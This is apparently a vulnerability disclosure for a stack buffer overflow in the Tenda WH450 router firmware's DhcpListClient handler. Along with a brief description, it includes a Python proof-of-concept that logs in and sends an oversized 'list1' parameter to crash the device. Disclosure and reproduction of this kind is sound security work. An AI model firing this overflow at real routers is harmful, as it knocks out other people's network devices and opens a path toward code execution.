# Bug Report: Buffer Overflow in Tenda WH450 V1.0.0.18 Router
A buffer overflow vulnerability has been discovered in the Tenda WH450 Router firmware version V1.0.0.18. The vulnerability exists in the `/goform/DhcpListClient` HTTP request handler and can be exploited remotely by unauthenticated attackers to achieve arbitrary code execution or cause denial of service conditions.

## Vulnerability Details

### Product Information
- **Product**: Tenda WH450
- **Affected Version**: V1.0.0.18
- **Vulnerability Type**: Stack-based Buffer Overflow

## Description:
A buffer overflow vulnerability exists in the HTTP request handler for the `/goform/DhcpListClient` endpoint. The vulnerability is triggered when processing requests containing the following parameters with excessive data lengths: `list%d`.

![alt text](image.png)

## poc
![alt text](image-1.png)
![alt text](image-2.png)
![alt text](image-3.png)

## Reproduce
```python
#!/usr/bin/env python3
from pwn import *
import requests

BASE_URL = "http://10.10.10.1"

def login(sess):
    login_url = BASE_URL + "/login/Auth"
    data = {
        "username": "",
        "password": "",
    }

    print("[*] logging in...")
    r = sess.post(login_url, data=data, allow_redirects=True)
    print(f"[*] final url: {r.url}")
    print(f"[*] status: {r.status_code}")

    print(f"[*] cookies after login: {sess.cookies.get_dict()}")


def send_payload(sess, payload):
    url = BASE_URL + "/goform/DhcpListClient"
    print("[*] sending payload...")
    r = sess.get(url, params=payload)
    print(f"Response status code: {r.status_code}")
    print(f"Response body:\n{r.text[:500]}") 

if __name__ == "__main__":
    sess = requests.Session()

    login(sess)

    payload = {
        "LISTLEN": "1",  # Indicate we're sending one list item
        "list1": "X" + "A" * 300,  # First char is skipped, then 300 'A's are copied to a 256-byte buffer
        "page": "lan_dhcp_static.asp"  # Required parameter for redirection
    }
    send_payload(sess, payload)

```